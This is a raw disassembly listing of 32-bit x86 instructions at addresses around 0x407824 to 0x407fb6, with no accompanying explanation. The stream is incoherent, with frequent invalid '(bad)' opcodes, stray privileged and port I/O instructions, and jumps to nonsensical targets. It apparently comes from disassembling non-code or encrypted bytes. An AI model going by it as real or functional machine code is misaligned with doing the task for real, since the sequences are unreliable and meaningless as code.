  407824:	cmp    eax,0x15a8773c
  407829:	stos   BYTE PTR es:[edi],al
  40782a:	loop   0x40786b
  40782c:	mov    ds,esp
  40782e:	scas   al,BYTE PTR es:[edi]
  40782f:	or     dl,ah
  407831:	in     eax,dx
  407832:	xor    BYTE PTR ds:[eax],bl
  407835:	pop    edi
  407836:	or     al,0x1b
  407838:	fdiv   QWORD PTR [ebp+0x45]
  40783b:	ins    DWORD PTR es:[edi],dx
  40783c:	ds pop eax
  40783e:	dec    ecx
  40783f:	pop    esi
  407840:	cmp    BYTE PTR [eax],0x51
  407843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407844:	add    eax,0x3324243b
  407849:	push   ecx
  40784a:	push   ebx
  40784b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40784c:	out    dx,eax
  40784d:	inc    edi
  40784e:	inc    esi
  40784f:	imul   ecx,esp,0xb6adcc5c
  407855:	push   eax
  407856:	mov    ds:0xd4a0925d,eax
  40785b:	mov    DWORD PTR ds:0x2a74e24f,ecx
  407861:	adc    al,0x2f
  407863:	cmp    ecx,0xffffffd2
  407866:	shl    DWORD PTR [edi-0x4c],0xca
  40786a:	mov    bl,0x67
  40786c:	mov    bl,bl
  40786e:	add    DWORD PTR [edx-0xb],eax
  407871:	or     edi,DWORD PTR [ebx-0x21]
  407874:	xchg   ebp,eax
  407875:	das    
  407876:	push   ss
  407877:	lods   al,BYTE PTR ds:[esi]
  407878:	pop    ebp
  407879:	aam    0x48
  40787b:	pusha  
  40787c:	mov    cl,0x75
  40787e:	pop    eax
  40787f:	nop
  407880:	mov    bh,0xa1
  407882:	dec    eax
  407883:	jo     0x407868
  407885:	pop    es
  407886:	inc    eax
  407887:	(bad)  
  407888:	arpl   WORD PTR [eax],di
  40788a:	mov    bh,0xee
  40788c:	jae    0x4078f2
  40788e:	and    DWORD PTR [ebp+0x58da736d],edx
  407894:	cmp    dl,BYTE PTR [edx-0x3a9d87fb]
  40789a:	mov    esi,0x650930a8
  40789f:	fnstcw WORD PTR [edx-0x1f]
  4078a2:	out    dx,eax
  4078a3:	ds dec esi
  4078a5:	shl    BYTE PTR [eax+0x5],0x92
  4078a9:	sub    al,0x58
  4078ab:	dec    edi
  4078ac:	sbb    ecx,DWORD PTR [ecx+0x19]
  4078af:	addr16 dec esp
  4078b1:	cs int 0x52
  4078b4:	pop    edx
  4078b5:	sub    ebx,DWORD PTR [esi-0x2afa0589]
  4078bb:	push   0xffffff97
  4078bd:	jmp    0x13ea8f09
  4078c2:	jle    0x407844
  4078c4:	repz loope 0x4078ea
  4078c7:	pop    es
  4078c8:	push   eax
  4078c9:	pusha  
  4078ca:	push   ss
  4078cb:	jmp    0x61f8:0xfaf8f8fc
  4078d2:	dec    eax
  4078d3:	push   ebp
  4078d4:	xchg   DWORD PTR [eax-0x17],eax
  4078d7:	mov    edi,gs
  4078d9:	test   eax,0x32a62c64
  4078de:	inc    edx
  4078df:	scas   al,BYTE PTR es:[edi]
  4078e0:	(bad)  
  4078e2:	cmp    BYTE PTR [ebx+edx*8],dh
  4078e5:	dec    ebp
  4078e6:	pop    ebx
  4078e7:	(bad)  
  4078e8:	loope  0x407959
  4078ea:	xchg   ecx,eax
  4078eb:	clc    
  4078ec:	adc    dh,BYTE PTR [ebp+0x8341109]
  4078f2:	jp     0x40796f
  4078f4:	xor    dh,cl
  4078f6:	das    
  4078f7:	mov    dh,0x5b
  4078f9:	or     BYTE PTR [edx-0x68],ch
  4078fc:	push   0x2da106f6
  407901:	push   0x68bea0e
  407906:	sub    al,0xae
  407908:	sub    eax,0x84fbb72c
  40790d:	ret    0xf7ff
  407910:	das    
  407911:	mov    bl,0xa8
  407913:	mov    ebx,ebp
  407915:	xor    ch,cl
  407917:	cdq    
  407918:	sti    
  407919:	mov    ebp,0xdc2f46f4
  40791e:	les    eax,FWORD PTR ds:0x8720d51f
  407924:	aam    0xab
  407926:	loopne 0x407982
  407928:	sub    esp,DWORD PTR [esi]
  40792a:	adc    DWORD PTR [edi-0x5c07efbc],ebp
  407930:	(bad)  
  407931:	adc    edi,DWORD PTR [ecx]
  407933:	fild   WORD PTR [ebx]
  407935:	push   esi
  407936:	jg     0x4078c2
  407938:	mov    ebp,0x63a0f231
  40793d:	aas    
  40793e:	adc    eax,0xf09ef342
  407943:	sbb    al,0x73
  407945:	repnz inc edi
  407947:	jb     0x4078f0
  407949:	mov    cl,bh
  40794b:	ins    DWORD PTR es:[edi],dx
  40794c:	jno    0x4079c2
  40794e:	ja     0x40792a
  407950:	int    0x26
  407952:	jp     0x407975
  407954:	lods   eax,DWORD PTR ds:[esi]
  407955:	inc    esp
  407956:	sbb    edx,ecx
  407958:	push   edx
  407959:	fldcw  WORD PTR [esi+0x2c104c38]
  40795f:	sub    DWORD PTR [eax-0x52abace],eax
  407965:	clc    
  407966:	xor    al,0xe0
  407968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407969:	gs inc esi
  40796b:	or     cl,BYTE PTR [edx-0x14]
  40796e:	repz or eax,0x90ecfdc4
  407974:	pop    esp
  407975:	dec    ebp
  407976:	xchg   ecx,eax
  407977:	or     BYTE PTR [esi+0x6367eb85],ch
  40797d:	inc    ecx
  40797e:	dec    ebp
  40797f:	ror    DWORD PTR [edx+edx*8],0x93
  407983:	out    0xf6,al
  407985:	inc    ebx
  407986:	ror    DWORD PTR [eax+0x456965a5],1
  40798c:	jno    0x407935
  40798e:	and    ecx,DWORD PTR [edx-0x22]
  407991:	rcl    BYTE PTR [eax-0x7fc3d2a2],1
  407997:	jmp    0x4079cd
  407999:	mov    ds,WORD PTR [eax-0x2f]
  40799c:	push   esp
  40799d:	sub    ebp,DWORD PTR [edx-0x4583adba]
  4079a3:	mov    ebx,DWORD PTR [di-0x26]
  4079a7:	aam    0x9d
  4079a9:	cmp    al,0x94
  4079ab:	inc    edi
  4079ac:	cmp    eax,0x94c35398
  4079b1:	inc    eax
  4079b2:	or     DWORD PTR [eax-0x5c99f13c],eax
  4079b8:	sub    DWORD PTR [ebx],0x5e02654
  4079be:	pop    edx
  4079bf:	test   al,0x61
  4079c1:	lock cmp bh,dl
  4079c4:	push   eax
  4079c5:	jp     0x4079c8
  4079c7:	scas   eax,DWORD PTR es:[edi]
  4079c8:	fs jne 0x407955
  4079cb:	jp     0x4079d0
  4079cd:	retf   
  4079ce:	hlt    
  4079cf:	jmp    0x4079df
  4079d1:	cmc    
  4079d2:	ins    BYTE PTR es:[edi],dx
  4079d3:	dec    esi
  4079d4:	aad    0x1d
  4079d6:	xchg   edi,eax
  4079d7:	add    eax,esp
  4079d9:	pusha  
  4079da:	outs   dx,BYTE PTR ds:[esi]
  4079db:	jne    0x4079ed
  4079dd:	popf   
  4079de:	or     al,BYTE PTR [esi+0x5b12a49f]
  4079e4:	and    al,0x5f
  4079e6:	push   ds
  4079e7:	das    
  4079e8:	pop    eax
  4079e9:	dec    edx
  4079ea:	jb     0x407a5e
  4079ec:	mov    edi,0x712d9c4b
  4079f1:	lods   eax,DWORD PTR ds:[esi]
  4079f2:	mov    esp,0x3df6261a
  4079f7:	shr    DWORD PTR [edx+edi*4],cl
  4079fa:	test   ch,0xa0
  4079fd:	inc    ebp
  4079fe:	loopne 0x407a19
  407a00:	jge    0x407a5a
  407a02:	cmp    edi,DWORD PTR [esi]
  407a04:	test   BYTE PTR [ebx+0xc],cl
  407a07:	fcom   DWORD PTR [edx]
  407a09:	xchg   DWORD PTR [edx-0x69557337],ecx
  407a0f:	or     ebx,0x3fe4c1e7
  407a15:	mov    bh,0xa5
  407a17:	fcomp  DWORD PTR [eax+0x17]
  407a1a:	push   edx
  407a1b:	or     al,0x8b
  407a1d:	scas   eax,DWORD PTR es:[edi]
  407a1e:	push   esi
  407a1f:	loop   0x407a00
  407a21:	out    dx,eax
  407a22:	pop    ss
  407a23:	xor    bl,BYTE PTR [ecx+0x3a730233]
  407a29:	dec    edi
  407a2a:	mov    ds:0xa8008333,eax
  407a2f:	ret    0x3308
  407a32:	xabort 0xba
  407a35:	lock push edi
  407a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a38:	push   ecx
  407a39:	pop    eax
  407a3a:	jbe    0x407a23
  407a3c:	jle    0x407ab1
  407a3e:	test   al,0x47
  407a40:	jmp    FWORD PTR [ebx]
  407a42:	push   ss
  407a43:	pop    edx
  407a44:	mov    dh,BYTE PTR [ebp-0xf]
  407a47:	xor    DWORD PTR [edx+0xc901e59],esi
  407a4d:	add    al,0xf6
  407a4f:	jne    0x407a75
  407a51:	fist   DWORD PTR [edx+0x5b64951]
  407a57:	inc    ecx
  407a58:	cmp    BYTE PTR [esi],ah
  407a5a:	xchg   esp,eax
  407a5b:	dec    ebp
  407a5c:	push   es
  407a5d:	faddp  st(4),st
  407a5f:	mov    BYTE PTR [edx-0x55],bl
  407a62:	push   esi
  407a63:	aad    0xa3
  407a65:	jg     0x4079e9
  407a67:	fdiv   QWORD PTR [esi+0x5b]
  407a6a:	ror    BYTE PTR [esi-0x64],cl
  407a6d:	(bad)  
  407a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a6f:	leave  
  407a70:	mov    eax,0x2d0c3b8c
  407a75:	xchg   esi,eax
  407a76:	test   al,0x83
  407a78:	dec    eax
  407a79:	sub    cl,BYTE PTR [esi+0x5]
  407a7c:	ins    BYTE PTR es:[edi],dx
  407a7d:	mov    dh,0x3
  407a7f:	dec    esp
  407a80:	mov    bl,0xd6
  407a82:	push   ebx
  407a83:	dec    ebx
  407a84:	sub    ecx,0xffffffb8
  407a87:	pop    edx
  407a88:	push   0x13
  407a8a:	dec    edi
  407a8b:	inc    edi
  407a8c:	aam    0x28
  407a8e:	xor    DWORD PTR [ecx+edi*1-0x33cd1c1d],ebp
  407a95:	fwait
  407a96:	aad    0xbf
  407a98:	ja     0x407a24
  407a9a:	cmp    bh,BYTE PTR [eax+0x3f]
  407a9d:	inc    eax
  407a9e:	push   ecx
  407a9f:	xlat   BYTE PTR cs:[ebx]
  407aa1:	adc    eax,0x9a9851a8
  407aa6:	jmp    0x407a82
  407aa8:	xchg   BYTE PTR [eax-0x17],dl
  407aab:	jg     0x407ae5
  407aad:	pop    ss
  407aae:	adc    esp,eax
  407ab0:	stos   BYTE PTR es:[edi],al
  407ab1:	ficomp WORD PTR [ecx+0x54fc17e3]
  407ab7:	or     ax,0x7c0c
  407abb:	(bad)  
  407abc:	jecxz  0x407b20
  407abe:	enter  0x406f,0xfb
  407ac2:	jecxz  0x407ac7
  407ac4:	leave  
  407ac5:	xchg   ebx,eax
  407ac6:	into   
  407ac7:	pop    es
  407ac8:	mov    DWORD PTR [edx+0x77],ebp
  407acb:	std    
  407acc:	dec    esp
  407acd:	mov    BYTE PTR [edx+0x379744f],ah
  407ad3:	cmp    al,0xbf
  407ad5:	ret    0x6087
  407ad8:	int    0x63
  407ada:	lock fdivr QWORD PTR [ebx-0x3be0d3eb]
  407ae1:	ret    
  407ae2:	and    bh,bh
  407ae4:	push   edi
  407ae5:	mov    cl,0x7e
  407ae7:	loop   0x407b14
  407ae9:	jle    0x407b5a
  407aeb:	fnstcw WORD PTR [edi]
  407aed:	out    0xe5,eax
  407aef:	jle    0x407af7
  407af1:	xchg   edx,eax
  407af2:	sub    dh,BYTE PTR [esi+0x5865cf3]
  407af8:	das    
  407af9:	mov    ebx,0x8c995257
  407afe:	jb     0x407b47
  407b00:	jmp    0x406cf966
  407b05:	add    bl,bl
  407b07:	pop    edi
  407b08:	xchg   BYTE PTR [edi+edx*4],bh
  407b0b:	out    0x85,al
  407b0d:	inc    eax
  407b0e:	mov    edx,0xfbc5c8e8
  407b13:	jns    0x407b1d
  407b15:	inc    esp
  407b16:	mov    ah,0xaa
  407b18:	(bad)  
  407b19:	xlat   BYTE PTR ds:[ebx]
  407b1a:	sbb    DWORD PTR [ebx],ebp
  407b1c:	jl     0x407b7f
  407b1e:	pop    es
  407b1f:	scas   al,BYTE PTR es:[edi]
  407b20:	sub    eax,0x33e24807
  407b25:	push   ebx
  407b26:	(bad)  
  407b27:	dec    eax
  407b28:	mov    edi,0x2b122293
  407b2d:	fwait
  407b2e:	jge    0x407b2e
  407b30:	stos   DWORD PTR es:[edi],eax
  407b31:	mov    ch,dh
  407b33:	xlat   BYTE PTR ds:[ebx]
  407b34:	es fwait
  407b36:	loope  0x407bb7
  407b38:	mov    ds:0xe7d2072b,al
  407b3d:	dec    edx
  407b3e:	push   0xfffffff6
  407b40:	inc    eax
  407b41:	test   DWORD PTR [ebx],0x330f2039
  407b47:	ins    DWORD PTR es:[edi],dx
  407b48:	fmul   DWORD PTR [edi]
  407b4a:	xchg   edi,eax
  407b4b:	in     eax,0x30
  407b4d:	mov    edx,0xe5a2f21c
  407b52:	in     eax,0x2a
  407b54:	les    eax,FWORD PTR [esi+0x291a9aa1]
  407b5a:	jnp    0x407b53
  407b5c:	mov    edx,0x27f48e08
  407b61:	inc    edx
  407b62:	sbb    al,0xd2
  407b64:	out    dx,al
  407b65:	mov    ah,0xdb
  407b67:	ret    0x3635
  407b6a:	sbb    esp,DWORD PTR [ecx]
  407b6c:	jns    0x407b9c
  407b6e:	(bad)  
  407b6f:	pop    ebp
  407b70:	lahf   
  407b71:	cli    
  407b72:	xor    al,0x1e
  407b74:	(bad)  
  407b75:	retf   0x3467
  407b78:	cld    
  407b79:	push   ebx
  407b7a:	inc    ebx
  407b7b:	or     DWORD PTR [ebx+ebp*2],ebp
  407b7e:	jg     0x407b4b
  407b80:	jg     0x407b60
  407b82:	push   ecx
  407b83:	out    dx,eax
  407b84:	cmp    DWORD PTR [eax-0x2dc6f6d2],eax
  407b8a:	lods   eax,DWORD PTR ds:[esi]
  407b8b:	xor    bh,BYTE PTR [edi-0x455a39bd]
  407b91:	jmp    0xc65b08a5
  407b96:	cmp    ah,BYTE PTR [edi]
  407b98:	pop    ebx
  407b99:	push   0xd8afe9ad
  407b9e:	sub    DWORD PTR [ebx],edx
  407ba0:	nop
  407ba1:	xor    edx,DWORD PTR [edx+0x17]
  407ba4:	fsub   st,st(0)
  407ba6:	pusha  
  407ba7:	xchg   ebp,eax
  407ba8:	xchg   esi,eax
  407ba9:	out    0x7c,eax
  407bab:	sbb    eax,0xff508b4
  407bb0:	add    eax,0x26f3dbe0
  407bb5:	pusha  
  407bb6:	adc    eax,0x998919ba
  407bbb:	inc    esp
  407bbc:	dec    eax
  407bbd:	fwait
  407bbe:	scas   al,BYTE PTR es:[edi]
  407bbf:	jbe    0x407bf3
  407bc1:	enter  0xd029,0x6c
  407bc5:	test   eax,0x5e471b20
  407bca:	(bad)  
  407bcb:	fadd   DWORD PTR [esi]
  407bcd:	fdivr  DWORD PTR [edi-0x45]
  407bd0:	addr16 mov ebx,0xadbd5c50
  407bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bd7:	dec    edx
  407bd8:	mov    dh,0x47
  407bda:	sub    bh,BYTE PTR [ecx]
  407bdc:	xchg   edx,eax
  407bdd:	pop    eax
  407bde:	loopne 0x407b68
  407be0:	les    ebx,FWORD PTR [ecx-0x43]
  407be3:	test   al,0xbd
  407be5:	xor    al,bh
  407be7:	pop    eax
  407be8:	adc    edi,DWORD PTR [edx-0x5f]
  407beb:	add    BYTE PTR [ebx+0x2ff5d8cb],al
  407bf1:	sbb    al,0x21
  407bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bf4:	xchg   ebp,edi
  407bf6:	test   eax,0x15bcb72c
  407bfb:	inc    eax
  407bfc:	xor    ecx,edi
  407bfe:	mov    bh,0x36
  407c00:	movd   DWORD PTR [ecx],mm6
  407c03:	test   al,0xe2
  407c05:	cwde   
  407c06:	mov    esi,DWORD PTR [ebx+0x75fcc4a2]
  407c0c:	pop    edi
  407c0d:	mov    eax,ds:0x3c3df2e9
  407c12:	inc    ebx
  407c13:	push   es
  407c14:	ins    DWORD PTR es:[edi],dx
  407c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c16:	xchg   ecx,eax
  407c17:	and    al,0x97
  407c19:	cmp    DWORD PTR [ebx+0x6b9d3416],esi
  407c1f:	pop    ebx
  407c20:	aam    0xcf
  407c22:	cmp    eax,0xb7be43be
  407c27:	sar    edx,1
  407c29:	pop    es
  407c2a:	retf   0x512c
  407c2d:	mov    ch,0x49
  407c2f:	or     bl,BYTE PTR [ebx+eax*1-0xd]
  407c33:	fiadd  WORD PTR [esi+0x62728c32]
  407c39:	scas   al,BYTE PTR es:[edi]
  407c3a:	iret   
  407c3b:	rcr    bl,cl
  407c3d:	rcr    DWORD PTR [ebp+0x6c],0xda
  407c41:	mov    cl,0xbd
  407c43:	sub    esi,esi
  407c45:	add    bl,BYTE PTR [edx+0x10]
  407c48:	xor    ebp,DWORD PTR [eax]
  407c4a:	push   es
  407c4b:	add    ecx,DWORD PTR [edi-0x74]
  407c4e:	jg     0x407cc8
  407c50:	jne    0x407c7a
  407c52:	ret    
  407c53:	icebp  
  407c54:	sub    BYTE PTR [ebp-0x2],bh
  407c57:	jmp    0xf7eb1346
  407c5c:	test   DWORD PTR [edi],0xe9406eca
  407c62:	fadd   QWORD PTR [edi+ecx*4+0x40ec59ab]
  407c69:	leave  
  407c6a:	dec    ecx
  407c6b:	sub    DWORD PTR [esi],0x79e62793
  407c71:	jge    0x407bfa
  407c73:	imul   esi,DWORD PTR [ebx-0x48],0x7d
  407c77:	cld    
  407c78:	push   0x5d
  407c7a:	bound  eax,QWORD PTR [esi+0x9]
  407c7d:	mov    ebx,0xd81c0720
  407c82:	cs aam 0xbd
  407c85:	jae    0x407c85
  407c87:	mov    esi,0xf8f9c91
  407c8c:	js     0x407ceb
  407c8e:	inc    esi
  407c90:	xor    al,0xba
  407c92:	mov    ebx,0xaf4c04ea
  407c97:	pop    esi
  407c98:	xor    al,0x63
  407c9a:	push   0xc861dc80
  407c9f:	add    edi,DWORD PTR [edi+esi*8+0x2bbf1bfd]
  407ca6:	les    esi,FWORD PTR [edi-0x9]
  407ca9:	test   DWORD PTR [ecx+eax*8],esi
  407cac:	leave  
  407cad:	mov    edi,0xf8bb9bfb
  407cb2:	sbb    DWORD PTR [eax+0x1e0b444c],edx
  407cb8:	lods   al,BYTE PTR fs:[esi]
  407cba:	push   esi
  407cbb:	xor    dh,ah
  407cbd:	push   ebx
  407cbe:	out    dx,al
  407cbf:	xor    edi,DWORD PTR gs:[esi+eiz*4]
  407cc3:	push   esp
  407cc4:	call   0xb237a090
  407cc9:	dec    edx
  407cca:	sub    bl,bl
  407ccc:	xchg   esi,eax
  407ccd:	shl    cl,0xf1
  407cd0:	mov    ch,BYTE PTR [ecx-0x46]
  407cd3:	xor    DWORD PTR [ecx+esi*8],edx
  407cd6:	jns    0x407d35
  407cd8:	repz es fucomi st,st(4)
  407cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cdd:	xchg   ecx,eax
  407cde:	dec    edi
  407cdf:	inc    esi
  407ce0:	test   BYTE PTR [edi+0x337a3d56],0x25
  407ce7:	fbstp  TBYTE PTR [ecx-0x5c]
  407cea:	inc    ebx
  407ceb:	outs   dx,BYTE PTR ds:[esi]
  407cec:	test   BYTE PTR [ecx+eax*1-0x4c8b11c7],cl
  407cf3:	add    al,0xed
  407cf5:	jo     0x407cb0
  407cf7:	cmp    esp,DWORD PTR [esi-0x43]
  407cfa:	dec    eax
  407cfb:	cwde   
  407cfc:	pop    esp
  407cfd:	xchg   ebx,eax
  407cfe:	adc    DWORD PTR [eax],ebx
  407d00:	rcl    BYTE PTR [edi-0x3a9ca8ca],cl
  407d06:	(bad)  
  407d07:	mul    BYTE PTR [ebx-0x3c]
  407d0a:	xchg   esi,eax
  407d0b:	js     0x407d3c
  407d0d:	rcr    BYTE PTR [ebp+0x30273f8f],0x32
  407d14:	aad    0xc3
  407d16:	mov    ebp,0x974504fb
  407d1b:	pop    edi
  407d1c:	stos   DWORD PTR es:[edi],eax
  407d1d:	sbb    eax,0xdbd15eea
  407d22:	mov    ch,0xe5
  407d24:	adc    eax,0x81ccdec6
  407d29:	and    bh,BYTE PTR [edx]
  407d2b:	jnp    0x407d63
  407d2d:	adc    cl,BYTE PTR [edx+0x3f]
  407d30:	xchg   edi,eax
  407d31:	and    eax,0x9fbdbecf
  407d36:	or     BYTE PTR [ebx-0xd76bb01],ah
  407d3c:	sbb    ah,0x6f
  407d3f:	stc    
  407d40:	out    0x86,al
  407d42:	push   ecx
  407d43:	aas    
  407d44:	test   BYTE PTR [ebx],dl
  407d46:	cmp    DWORD PTR [esi+esi*2+0x5baddbdb],0x291f477e
  407d51:	mov    cs,WORD PTR [edi]
  407d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d54:	and    eax,ecx
  407d56:	xor    al,BYTE PTR [esi-0x37]
  407d59:	repz mov bl,0xdc
  407d5c:	cwde   
  407d5d:	lods   al,BYTE PTR ds:[esi]
  407d5e:	pop    edi
  407d5f:	scas   al,BYTE PTR es:[edi]
  407d60:	scas   al,BYTE PTR es:[edi]
  407d61:	and    al,0x2a
  407d63:	cmp    BYTE PTR [ebx-0x13],bh
  407d66:	pop    es
  407d67:	mov    ah,0xf
  407d69:	data16 aad 0x3
  407d6c:	and    bl,BYTE PTR [ecx+0x5aef7925]
  407d72:	mov    esp,0x6ee66375
  407d77:	push   es
  407d78:	cwde   
  407d79:	scas   eax,DWORD PTR es:[edi]
  407d7a:	adc    eax,0x4a405b39
  407d7f:	or     DWORD PTR [eax],esp
  407d81:	add    BYTE PTR [edx-0x3c],ch
  407d84:	mov    ch,0x85
  407d86:	push   ss
  407d87:	out    0x22,al
  407d89:	xchg   edx,ebp
  407d8b:	nop    DWORD PTR [edx+ebx*1-0x13]
  407d90:	outs   dx,BYTE PTR ds:[esi]
  407d91:	int3   
  407d92:	stos   DWORD PTR es:[edi],eax
  407d93:	sti    
  407d94:	cmc    
  407d95:	retf   0xb697
  407d98:	adc    bh,bh
  407d9a:	les    esp,FWORD PTR [ecx+esi*1-0x7c]
  407d9e:	ret    
  407d9f:	mov    esi,0x8424c791
  407da4:	mov    cl,0xfe
  407da6:	inc    edx
  407da7:	call   0xb0189521
  407dac:	jnp    0x407e11
  407dae:	enter  0x7da6,0x8
  407db2:	mov    eax,0xb5cd3c35
  407db7:	fsubr  QWORD PTR [edx]
  407db9:	add    ecx,esp
  407dbb:	nop
  407dbc:	xchg   ebp,eax
  407dbd:	fsubr  DWORD PTR [ebx]
  407dbf:	mov    ?,WORD PTR [esi-0x3435182b]
  407dc5:	jmp    0x407d5b
  407dc7:	or     edx,esi
  407dc9:	cmp    esi,DWORD PTR [ebp-0x51]
  407dcc:	adc    BYTE PTR [edi+0x1660de30],al
  407dd2:	mulps  xmm5,xmm0
  407dd5:	test   BYTE PTR [eax],ch
  407dd7:	bound  ebx,QWORD PTR [edx-0x5899604b]
  407ddd:	xchg   esi,eax
  407dde:	repz es lock cwde 
  407de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407de3:	dec    edx
  407de4:	js     0x407e32
  407de6:	sbb    ebx,DWORD PTR [ecx]
  407de8:	or     al,0x65
  407deb:	inc    ebp
  407dec:	rol    DWORD PTR [ecx-0x19],0x42
  407df0:	mov    dh,BYTE PTR ds:0x685241a8
  407df6:	div    DWORD PTR [edi+0x31]
  407df9:	mov    dl,0xb3
  407dfb:	popa   
  407dfc:	outs   dx,DWORD PTR ds:[esi]
  407dfd:	int    0x7c
  407dff:	adc    DWORD PTR [ebx-0x49b40405],ebp
  407e05:	mov    edi,0x71abe563
  407e0a:	add    al,0x9d
  407e0c:	lods   al,BYTE PTR ds:[esi]
  407e0d:	push   ebp
  407e0e:	jge    0x407dfc
  407e10:	mov    esi,0x6eeec694
  407e15:	add    al,0x71
  407e17:	jno    0x407da9
  407e19:	(bad)  
  407e1a:	sti    
  407e1b:	inc    ebx
  407e1c:	ins    BYTE PTR es:[edi],dx
  407e1d:	jge    0x407dd3
  407e1f:	addr16 pop edi
  407e21:	std    
  407e22:	stos   BYTE PTR es:[edi],al
  407e23:	mov    ebp,0xbac282c5
  407e28:	sub    al,0x92
  407e2a:	xor    ch,ch
  407e2c:	pop    es
  407e2d:	and    esp,DWORD PTR [esi]
  407e2f:	dec    esi
  407e30:	pop    eax
  407e31:	mov    ds:0xf3c7808a,al
  407e36:	mov    ss,esp
  407e38:	adc    al,0x4b
  407e3a:	scas   eax,DWORD PTR es:[edi]
  407e3b:	push   0x7278c3c2
  407e40:	jge    0x407e65
  407e42:	cli    
  407e43:	jmp    0xb454e0bf
  407e48:	push   ebp
  407e49:	aad    0x76
  407e4b:	push   esp
  407e4c:	repnz cmp edx,ebx
  407e4f:	test   al,0x29
  407e51:	or     eax,0x1631016c
  407e56:	rcl    dh,0x22
  407e59:	xchg   BYTE PTR [edi],dl
  407e5b:	(bad)  
  407e5c:	(bad)  
  407e5d:	pop    ebp
  407e5e:	push   ebx
  407e5f:	test   BYTE PTR [eax],ch
  407e61:	gs inc esp
  407e63:	or     al,0xfb
  407e65:	push   esp
  407e66:	cs in  eax,0x2c
  407e69:	outs   dx,DWORD PTR ds:[esi]
  407e6a:	push   0x71
  407e6c:	push   0xbafbbcfd
  407e71:	mov    esi,0x1e21d13a
  407e76:	scas   eax,DWORD PTR es:[edi]
  407e77:	dec    ecx
  407e78:	jge    0x407eb6
  407e7a:	dec    eax
  407e7b:	xchg   esi,eax
  407e7c:	js     0x407ec3
  407e7e:	pop    eax
  407e7f:	cmp    ecx,edi
  407e81:	daa    
  407e82:	ret    0x2a5b
  407e85:	in     eax,0xa4
  407e87:	mov    cl,0xff
  407e89:	ds aaa 
  407e8b:	lods   eax,DWORD PTR ds:[esi]
  407e8c:	xchg   esi,eax
  407e8d:	mov    esi,0x19ba351b
  407e92:	mov    ecx,0xa654c495
  407e97:	jmp    0x407ead
  407e99:	lock out dx,al
  407e9b:	xchg   ebp,eax
  407e9c:	pusha  
  407e9d:	dec    esi
  407e9e:	cdq    
  407e9f:	mov    ebp,0xe5dcc4d4
  407ea4:	and    ch,BYTE PTR [ebp-0x29569f08]
  407eaa:	pop    ss
  407eab:	das    
  407eac:	push   es
  407ead:	inc    edi
  407eae:	add    al,0x6
  407eb0:	repnz hlt 
  407eb2:	retf   
  407eb3:	jmp    0x8e39:0xb368952f
  407eba:	jns    0x407e6e
  407ebc:	or     ecx,DWORD PTR [ecx+edi*2+0x3]
  407ec0:	test   al,0xb1
  407ec2:	test   eax,0xc5498a14
  407ec7:	outs   dx,DWORD PTR ds:[esi]
  407ec8:	and    al,0x27
  407eca:	dec    esp
  407ecb:	adc    DWORD PTR [ebp+0x3bd70367],ebx
  407ed1:	fidivr DWORD PTR fs:[ebx]
  407ed4:	call   0x810f:0xb6de1214
  407edb:	rcl    ah,0x4a
  407ede:	fadd   DWORD PTR [esi-0x80]
  407ee1:	lahf   
  407ee2:	dec    ecx
  407ee3:	add    eax,0x32f28233
  407ee8:	sub    ebp,DWORD PTR [ebx+0x3daf176a]
  407eee:	push   ebp
  407eef:	mov    ds:0x9a9bc09d,eax
  407ef4:	jle    0x407f10
  407ef6:	push   esp
  407ef7:	xchg   BYTE PTR [eax-0x782c458f],ch
  407efd:	mov    al,ds:0x331f5154
  407f02:	mov    edi,DWORD PTR [edx-0x443b4d7b]
  407f08:	rcl    BYTE PTR [ecx-0x404f8386],1
  407f0e:	test   eax,0x509f6f03
  407f13:	mov    ah,BYTE PTR [esp+esi*2-0xe]
  407f17:	adc    esp,ebx
  407f19:	sub    al,0xee
  407f1b:	add    esp,DWORD PTR [eax-0x4172ce95]
  407f21:	fs addr16 jmp 0xfce8:0xda0eda80
  407f2a:	das    
  407f2b:	push   eax
  407f2c:	int3   
  407f2d:	jp     0x407f49
  407f2f:	imul   edx,eax,0xc1586b53
  407f35:	mov    WORD PTR [ecx-0x22],ss
  407f38:	inc    edx
  407f39:	pop    es
  407f3a:	ins    BYTE PTR es:[edi],dx
  407f3b:	cmp    BYTE PTR [edx],cl
  407f3d:	pop    ebp
  407f3e:	and    ebx,DWORD PTR [ebp+0xbc27290]
  407f44:	lds    ecx,FWORD PTR [ebp+0x20ba098b]
  407f4a:	(bad)  
  407f4b:	mov    ebx,0xe71321d2
  407f50:	mov    dl,0x7
  407f52:	loopne 0x407f8a
  407f54:	out    0xf0,eax
  407f56:	or     eax,0x52b8e633
  407f5b:	in     al,0x93
  407f5d:	or     edx,DWORD PTR [ecx+ebx*8-0x2e91c46f]
  407f64:	rcpps  xmm5,XMMWORD PTR [esi]
  407f67:	sti    
  407f68:	jmp    0xf977c250
  407f6d:	mov    al,0x81
  407f6f:	dec    ebx
  407f70:	push   cs
  407f71:	jno    0x407f79
  407f73:	sub    BYTE PTR [ecx-0x45074edb],bl
  407f79:	enter  0x22db,0x79
  407f7d:	(bad)  
  407f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f7f:	mov    edx,0xf730dd7e
  407f84:	sbb    edi,ebx
  407f86:	or     al,0xd4
  407f88:	sub    ebx,DWORD PTR [ebp+0x4334550a]
  407f8e:	jg     0x407fac
  407f90:	stos   BYTE PTR es:[edi],al
  407f91:	sub    ah,al
  407f93:	fisubr WORD PTR [ecx]
  407f95:	nop
  407f96:	adc    al,0x26
  407f98:	rol    BYTE PTR [ebx-0x42b945cb],0xcd
  407f9f:	sahf   
  407fa0:	ror    DWORD PTR ds:0x46569333,cl
  407fa6:	pop    esp
  407fa7:	aas    
  407fa8:	ja     0x407fee
  407faa:	shl    DWORD PTR [ebp-0x5b822b17],1
  407fb0:	(bad)  
  407fb1:	sbb    eax,0xe72f8364
  407fb6:	loope  0x407f5c
